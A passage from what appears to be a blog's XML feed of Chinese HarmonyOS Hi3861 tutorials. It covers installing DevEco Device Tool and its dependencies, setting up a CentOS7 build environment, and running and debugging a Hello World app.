data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210835.40443588200814218790208181727229:50520720011259:2800:B59C18547B6D75F29CC3CA9CCCA7C5E8B625040FA33ED644D381443643B20BC8.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p></li><li><p>打开命令行工具，输入 python --version，检查安装结果。</p><p><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210835.55187266828086165550009510386782:50520720011259:2800:2682BCA6236A7FDBDB501A78A710951BDC76177B025D4708F1ECB162419BE123.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p></li><li><p>在命令行工具中，分别执行如下命令设置 pip 源，用于后续安装 DevEco Device Tool 过程中下载依赖的组件包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip config set global.trusted-host repo.huaweicloud.compip config set global.index-url https://repo.huaweicloud.com/repository/pypi/simplepip config set global.timeout 120</span><br></pre></td></tr></table></figure></li></ol><h2 id="安装nodejs"><a class="markdownIt-Anchor" href="#安装nodejs">#</a> 安装 Node.js</h2><p>说明</p><p>如果已安装 Node.js，打开命令行工具，输入<strong> node -v</strong> 命令，检查版本号是否为 12.0.0 及以上版本。</p><ol><li><p>点击下载后的软件包进行安装，全部按照默认设置点击<strong> Next</strong>，直至<strong> Finish</strong>。安装过程中，Node.js 会自动在系统的 path 环境变量中配置 node.exe 的目录路径。</p></li><li><p>重新打开命令行工具，输入 “node -v” 命令，能正常查询 Node.js 的版本号，说明 Node.js 安装成功。</p><p><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210836.62539158827713818108212284791780:50520720011259:2800:5ABC4B73BD2D770166BB7675F013AEEC0670D6092D7A205CC87C862CEA0BAB7F.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p></li></ol><h2 id="安装hpm"><a class="markdownIt-Anchor" href="#安装hpm">#</a> 安装 hpm</h2><p>该方式需先确保<strong> Node.js</strong> 安装成功。</p><p>在安装 hpm 前，请检查网络连接状态，如果网络不能直接访问 Internet，则需要通过代理服务器才可以访问。这种情况下，需要先<a href="https://device.harmonyos.com/cn/docs/ide/user-guides/npm_proxy-0000001054491032">设置 npm 代理</a>，才能安装 hpm。</p><p>说明</p><p>如果已安装 hpm，可以执行<strong> npm update -g @ohos/hpm-cli</strong> 命令升级 hpm 至最新版本。</p><ol><li><p>建议将 npm 源配置为国内镜像，例如设置为华为云镜像源。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://repo.huaweicloud.com/repository/npm/</span><br></pre></td></tr></table></figure></li><li><p>打开命令行工具，执行如下命令安装最新版本 hpm。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @ohos/hpm-cli</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210836.90553156380138182569465396373876:50520720011259:2800:BA75EB2D31FF2C2F3331645652878BEB0F9B6CB577049C4AAC0C047FD664A334.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p></li><li><p>安装完成后，执行如下命令（V 为大写字母）检查 hpm 安装结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hpm -V</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210836.10048763675015873863276075913893:50520720011259:2800:7A7CA700AAC1FBF8778EBD971C4C3A7044D6542DACA7C129ECC2BB7F8CDED52C.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p></li></ol><h2 id="安装deveco-device-tool插件"><a class="markdownIt-Anchor" href="#安装deveco-device-tool插件">#</a> 安装 DevEco Device Tool 插件</h2><p>安装 DevEco Device Tool 插件，<strong>主机的用户名不能包含中文字符</strong>，否则可能导致运行出现错误。</p><p>DevEco Device Tool 正常运行需要依赖于 C/C<ins> 和 CodeLLDB 插件，在安装完 DevEco Device Tool 后，会自动从 Visual Studio Code 的插件市场安装 C/C</ins> 和 CodeLLDB 插件。因此，在安装 DevEco Device Tool 前，请检查 Visual Studio Code 的网络连接状态，如果网络不能直接访问 Internet，则需要通过代理服务器才可以访问，请先<a href="https://device.harmonyos.com/cn/docs/ide/user-guides/vscode_proxy-0000001074231144"> Visual Studio Code 代理设置</a>。</p><p>说明</p><p>安装 DevEco Device Tool 时，请先关闭 Visual Studio Code。</p><ol><li><p>解压 DevEco Device Tool 插件压缩包，双击安装包程序进行安装。</p></li><li><p>安装过程中，会自动安装 DevEco Device Tool 所需的依赖文件（如 C/C++ 和 CodeLLDB 插件）和执行程序。</p><p><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210836.31800168642290558649828696932171:50520720011259:2800:EABAA958E2D53F692068615BA4B3203811102E3BAE8B2D9259BA3EA99CAA8CAE.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p></li><li><p>安装完成后，会自动关闭命令行工具窗口。</p></li><li><p>启动 Visual Studio Code，点击左侧的<img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210836.37798261809799456293951828879216:50520720011259:2800:28C802BF1F065C9925349BDFCD56F9FDF6646D9ED5509A0925420A5BF65A0523.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"> 按钮，检查 INSTALLED 中，是否已成功安装 C/C++、CodeLLDB 和 DevEco Device Tool。</p><p>说明</p><p>如果 C/C++ 和 CodeLLDB 插件安装不成功，则 DevEco Device Tool 不能正常运行，解决方法，详细请参考：<a href="https://device.harmonyos.com/cn/docs/ide/user-guides/offline_plugin_install-0000001074376846">离线安装 C/C++ 和 CodeLLDB 插件</a>。</p><p><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210836.99646568113737003039809236695544:50520720011259:2800:E24828A9E71543A0B8DF4A0B97CB5D04CD21107DFC1BFBF69718C79E9E5558DB.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙设备开发(hi3861) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 平台 </tag>
            
            <tag> 鸿蒙 </tag>
            
            <tag> 单片机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(3)CentOS7中安装鸿蒙编译环境</title>
      <link href="/2021/07/27/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(3)CentOS7%E9%B8%BF%E8%92%99%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
      <url>/2021/07/27/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(3)CentOS7%E9%B8%BF%E8%92%99%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h3 id="安装centos7"><a class="markdownIt-Anchor" href="#安装centos7">#</a> 安装 CentOS7</h3><p>在 VirtualBox 中最小化安装 CentOS（略）</p><h3 id="配置网络"><a class="markdownIt-Anchor" href="#配置网络">#</a> 配置网络</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-enp0s3 </span><br><span class="line">systemctl restart network</span><br><span class="line">ip addr</span><br><span class="line">ping www.baidu.com</span><br><span class="line"><span class="meta">#</span><span class="bash">设置dhcp动态分配网络</span></span><br><span class="line">yum install net-tools</span><br><span class="line">yum install wget</span><br><span class="line"><span class="meta">#</span><span class="bash">安装常用软件</span></span><br></pre></td></tr></table></figure><h3 id="安装专用编译器"><a class="markdownIt-Anchor" href="#安装专用编译器">#</a> 安装专用编译器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf gcc_riscv32-linux-7.3.0.tar.gz -C /usr/local/</span><br><span class="line"><span class="meta">#</span><span class="bash">解压到/usr/<span class="built_in">local</span></span></span><br><span class="line">vi /etc/profile</span><br><span class="line">source /etc/profile</span><br><span class="line"><span class="meta">#</span><span class="bash">添加bin目录到环境变量中</span></span><br><span class="line">riscv32-unknown-elf-gcc --version</span><br><span class="line"><span class="meta">#</span><span class="bash">查看结果</span></span><br></pre></td></tr></table></figure><h3 id="安装python37"><a class="markdownIt-Anchor" href="#安装python37">#</a> 安装 Python3.7+</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tgz</span><br><span class="line">ls</span><br><span class="line">tar -zxvf Python-3.9.0.tgz -C /usr/local/</span><br><span class="line"><span class="meta">#</span><span class="bash">解压安装包</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装之前下载以下需要的依赖软件</span></span><br><span class="line">yum groupinstall -y &quot;Development tools&quot;</span><br><span class="line">yum install -y &quot;Development tools&quot;</span><br><span class="line">yum install -y openssl-devel</span><br><span class="line">yum install -y libffi libffi-devel</span><br><span class="line">yum install -y bzip2-devel</span><br><span class="line">yum install -y sqlite-devel</span><br><span class="line">yum install -y readline-devel</span><br><span class="line">yum install -y libuuid-devel</span><br><span class="line">yum install -y uuid-devel</span><br><span class="line">yum install -y xz-devel</span><br><span class="line">yum install -y gdbm-devel</span><br><span class="line">yum install -y tk-devel</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装Python</span></span><br><span class="line">cd /usr/local/Python-3.9.0/</span><br><span class="line">ls</span><br><span class="line">./configure --prefix=/usr/local/python3</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">建立软链接，不影响系统自带的python</span></span><br><span class="line">ln -s /usr/local/python3/bin/python3 /usr/bin/python3</span><br><span class="line">ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3</span><br><span class="line">pip3 --version</span><br><span class="line">python3 --version</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装python包</span></span><br><span class="line">pip3 installsetuptools</span><br><span class="line">pip3 install setuptools</span><br><span class="line">pip3 install kconfiglib</span><br><span class="line">pip3 install pycryptodome</span><br><span class="line">pip3 install six --upgrade --ignore-installed six</span><br><span class="line">pip3 install ecdsa</span><br></pre></td></tr></table></figure><h3 id="安装scons"><a class="markdownIt-Anchor" href="#安装scons">#</a> 安装 SCONS</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf scons-4.0.1.tar.gz </span><br><span class="line">cd SCons-4.0.1/</span><br><span class="line">python3 setup.py install</span><br><span class="line">ln -s /usr/local/python3/bin/scons /usr/bin/scons</span><br></pre></td></tr></table></figure><h3 id="安装gn"><a class="markdownIt-Anchor" href="#安装gn">#</a> 安装 gn</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf gn-linux-x86-1717.tar.gz -C /usr/local/</span><br><span class="line">ln -s /usr/local/gn /usr/bin/gn</span><br><span class="line">gn --version</span><br></pre></td></tr></table></figure><h3 id="安装ninja"><a class="markdownIt-Anchor" href="#安装ninja">#</a> 安装 ninja</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf ninja.1.9.0.tar -C /usr/local/</span><br><span class="line">ln -s /usr/local/ninja/ninja /usr/bin/ninja</span><br><span class="line">ninja --version</span><br></pre></td></tr></table></figure><h3 id="安装llvm"><a class="markdownIt-Anchor" href="#安装llvm">#</a> 安装 llvm</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf llvm-linux-9.0.0-36191.tar -C /usr/local/</span><br><span class="line">vi /etc/profile</span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><h3 id="安装hb"><a class="markdownIt-Anchor" href="#安装hb">#</a> 安装 hb</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --user ohos-build</span><br><span class="line">vi ~/.bashrc </span><br><span class="line">source ./.bashrc</span><br></pre></td></tr></table></figure><h3 id="解压源码并编译"><a class="markdownIt-Anchor" href="#解压源码并编译">#</a> 解压源码并编译</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir code-1.0</span><br><span class="line">tar -zxvf code-1.0.tar.gz -C ./code-1.0</span><br><span class="line">cd code-1.0</span><br><span class="line"><span class="meta">#</span><span class="bash">使用python3编译源码</span></span><br><span class="line">python3 build.py wifiiot</span><br><span class="line"><span class="meta">#</span><span class="bash">编译成功</span></span><br></pre></td></tr></table></figure><h3 id="安装samba服务"><a class="markdownIt-Anchor" href="#安装samba服务">#</a> 安装 Samba 服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yum install samba</span><br><span class="line">systemctl enable smb</span><br><span class="line"><span class="meta">#</span><span class="bash">编辑配置文件</span></span><br><span class="line">vi /etc/samba/smb.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">创建用户</span></span><br><span class="line">smbpasswd -a root</span><br><span class="line">systemctl start smb</span><br><span class="line">netstat -antp</span><br><span class="line"><span class="meta">#</span><span class="bash">配置selinux及防火墙</span></span><br><span class="line">sestatus -b |grep samba</span><br><span class="line">setsebool -P samba_export_all_rw 1</span><br></pre></td></tr></table></figure><h3 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献">#</a> 参考文献</h3><p>[1] Centos 下安装鸿蒙 LiteOS 编译环境<br><a href="https://www.sohu.com/a/425806016_463994"> https://www.sohu.com/a/425806016_463994</a><br> [2] 华为设备开发快速入门官方文档<br><a href="https://device.harmonyos.com/cn/docs/start/introduce/quickstart-lite-env-setup-lin-0000001105407498"> https://device.harmonyos.com/cn/docs/start/introduce/quickstart-lite-env-setup-lin-0000001105407498</a></p>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙设备开发(hi3861) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 平台 </tag>
            
            <tag> 鸿蒙 </tag>
            
            <tag> 单片机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(4)运行Hello World</title>
      <link href="/2021/07/27/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(4)%E8%BF%90%E8%A1%8CHello%20World/"/>
      <url>/2021/07/27/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(4)%E8%BF%90%E8%A1%8CHello%20World/</url>
      
        <content type="html"><![CDATA[<h1 id="运行hello-world"><a class="markdownIt-Anchor" href="#运行hello-world">#</a> 运行 Hello World</h1><p>更新时间: 2021-07-21 09:12</p><p>本示例将演示如何编写简单业务，输出 “Hello World”，初步了解 HarmonyOS 如何运行在开发板上。</p><h2 id="修改源码"><a class="markdownIt-Anchor" href="#修改源码">#</a> 修改源码</h2><p>bugfix 和新增业务两种情况，涉及源码修改。下面以新增业务（my_first_app）为例，向开发者介绍如何进行源码修改。</p><ol><li><p>确定目录结构。</p><p>开发者编写业务时，务必先在./applications/sample/wifi-iot/app 路径下新建一个目录（或一套目录结构），用于存放业务源码文件。</p><p>例如：在 app 下新增业务 my_first_app，其中 hello_world.c 为业务代码，BUILD.gn 为编译脚本，具体规划目录结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">   └── applications</span><br><span class="line">└── sample        </span><br><span class="line">   └── wifi-iot            </span><br><span class="line">   └── app                </span><br><span class="line">   │── my_first_app                </span><br><span class="line">   │  │── hello_world.c                </span><br><span class="line">   │  └── BUILD.gn                </span><br><span class="line">   └── BUILD.gn</span><br></pre></td></tr></table></figure></li><li><p>编写业务代码。</p><p>新建./applications/sample/wifi-iot/app/my_first_app 下的 hello_world.c 文件，在 hello_world.c 中新建业务入口函数 HelloWorld，并实现业务逻辑。并在代码最下方，使用 HarmonyOS 启动恢复模块接口 SYS_RUN () 启动业务。（SYS_RUN 定义在 ohos_init.h 文件中）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ohos_init.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ohos_types.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HelloWorld</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[DEMO] Hello world.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">SYS_RUN(HelloWorld);</span><br></pre></td></tr></table></figure></li><li><p>编写用于将业务构建成静态库的 BUILD.gn 文件。</p><p>新建./applications/sample/wifi-iot/app/my_first_app 下的 BUILD.gn 文件，并完成如下配置。</p><p>如<a href="https://device.harmonyos.com/cn/docs/start/introduce/quickstart-lite-steps-board3861-running-0000001105048942#ZH-CN_TOPIC_0000001128311062__li5479332115116">步骤 1</a> 所述，BUILD.gn 文件由三部分内容（目标、源文件、头文件路径）构成，需由开发者完成填写。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">static_library(&quot;myapp&quot;) &#123;</span><br><span class="line">sources = [ </span><br><span class="line">&quot;hello_world.c&quot;   </span><br><span class="line">]    </span><br><span class="line">include_dirs = [ </span><br><span class="line">&quot;//utils/native/lite/include&quot;    </span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>static_library 中指定业务模块的编译结果，为静态库文件 libmyapp.a，开发者根据实际情况完成填写。</li><li>sources 中指定静态库.a 所依赖的.c 文件及其路径，若路径中包含 &quot;//“则表示绝对路径（此处为代码根路径），若不包含”//&quot; 则表示相对路径。</li><li>include_dirs 中指定 source 所需要依赖的.h 文件路径。</li></ul></li><li><p>编写模块 BUILD.gn 文件，指定需参与构建的特性模块。</p><p>配置./applications/sample/wifi-iot/app/BUILD.gn 文件，在 features 字段中增加索引，使目标模块参与编译。features 字段指定业务模块的路径和目标，以 my_first_app 举例，features 字段配置如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import(&quot;//build/lite/config/component/lite_component.gni&quot;)</span><br><span class="line"></span><br><span class="line">lite_component(&quot;app&quot;) &#123; </span><br><span class="line">features = [   </span><br><span class="line">    &quot;my_first_app:myapp&quot;,  </span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>my_first_app 是相对路径，指向./applications/sample/wifi-iot/app/my_first_app/BUILD.gn。</li><li>myapp 是目标，指向./applications/sample/wifi-iot/app/my_first_app/BUILD.gn 中的 static_library (“myapp”)。</li></ul></li></ol><h2 id="调测验证"><a class="markdownIt-Anchor" href="#调测验证">#</a> 调测验证</h2><p>目前调试验证的方法有两种，分别为通过 printf 打印日志、通过 asm 文件定位 panic 问题，开发者可以根据具体业务情况选择。</p><p>由于本示例业务简单，采用 printf 打印日志的调试方式即可。下面开始介绍这两种调试手段的使用方法。</p><h3 id="printf打印"><a class="markdownIt-Anchor" href="#printf打印">#</a> printf 打印</h3><p>代码中增加 printf 维测，信息会直接打印到串口上。开发者可在业务关键路径或业务异常位置增加日志打印，如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HelloWorld</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[DEMO] Hello world.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="根据asm文件进行问题定位"><a class="markdownIt-Anchor" href="#根据asm文件进行问题定位">#</a> 根据 asm 文件进行问题定位</h3><p>系统异常退出时，会在串口上打印异常退出原因调用栈信息，如下文所示。通过解析异常栈信息可以定位异常位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">=======KERNEL PANIC=======</span><br><span class="line">**********************Call Stack*********************</span><br><span class="line">Call Stack 0 -- 4860d8 addr:f784c</span><br><span class="line">Call Stack 1 -- 47b2b2 addr:f788c</span><br><span class="line">Call Stack 2 -- 3e562c addr:f789c</span><br><span class="line">Call Stack 3 -- 4101de addr:f78ac</span><br><span class="line">Call Stack 4 -- 3e5f32 addr:f78cc</span><br><span class="line">Call Stack 5 -- 3f78c0 addr:f78ec</span><br><span class="line">Call Stack 6 -- 3f5e24 addr:f78fc</span><br><span class="line">********************Call Stack end*******************</span><br></pre></td></tr></table></figure><p>为解析上述调用栈信息，需要使用到 Hi3861_wifiiot_app.asm 文件，该文件记录了代码中函数在 Flash 上的符号地址以及反汇编信息。asm 文件会随版本大包一同构建输出，存放在./out/wifiiot/ 路径下。</p><ol><li><p>将调用栈 CallStack 信息保存到 txt 文档中，以便于编辑。（可选）</p></li><li><p>打开 asm 文件，并搜索 CallStack 中的地址，列出对应的函数名 信息。通常只需找出前几个栈信息对应的函数，就可明确异常代码方向。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Call Stack 0 -- 4860d8 addr:f784c -- WadRecvCB</span><br><span class="line">Call Stack 1 -- 47b2b2 addr:f788c -- wal_sdp_process_rx_data</span><br><span class="line">Call Stack 2 -- 3e562c addr:f789c</span><br><span class="line">Call Stack 3 -- 4101de addr:f78ac</span><br><span class="line">Call Stack 4 -- 3e5f32 addr:f78cc</span><br><span class="line">Call Stack 5 -- 3f78c0 addr:f78ec</span><br><span class="line">Call Stack 6 -- 3f5e24 addr:f78fc</span><br></pre></td></tr></table></figure></li><li><p>根据以上调用栈信息，可以定位 WadRecvCB 函数中出现了异常。</p><p><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210837.22448825207289523611021740783323:50520720011259:2800:735A2361AAE8E1229219B5AF3740DCFADC23F587CC83A074B586A05640ADD9BB.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p></li><li><p>完成代码排查及修改。</p></li></ol><h2 id="运行结果"><a class="markdownIt-Anchor" href="#运行结果">#</a> 运行结果</h2><p>示例代码编译、烧录、运行、调测后，在串口界面会显示如下结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ready to OS start</span><br><span class="line">FileSystem mount ok.</span><br><span class="line">wifi init success!</span><br><span class="line">[DEMO] Hello world.</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="/assets/hello_world.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt=""></p><h2 id="下一步学习"><a class="markdownIt-Anchor" href="#下一步学习">#</a> 下一步学习</h2><p>恭喜，您已完成 Hi3861 WLAN 模组快速上手！建议您下一步进入<a href="https://device.harmonyos.com/cn/docs/develop/demo/device-wifi-led-outcontrol-0000001050059068"> WLAN 产品开发</a>的学习 。</p>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙设备开发(hi3861) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 鸿蒙 </tag>
            
            <tag> 单片机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(5)LED外设控制</title>
      <link href="/2021/07/27/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(5)LED%E5%A4%96%E8%AE%BE%E6%8E%A7%E5%88%B6/"/>
      <url>/2021/07/27/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(5)LED%E5%A4%96%E8%AE%BE%E6%8E%A7%E5%88%B6/</url>
      
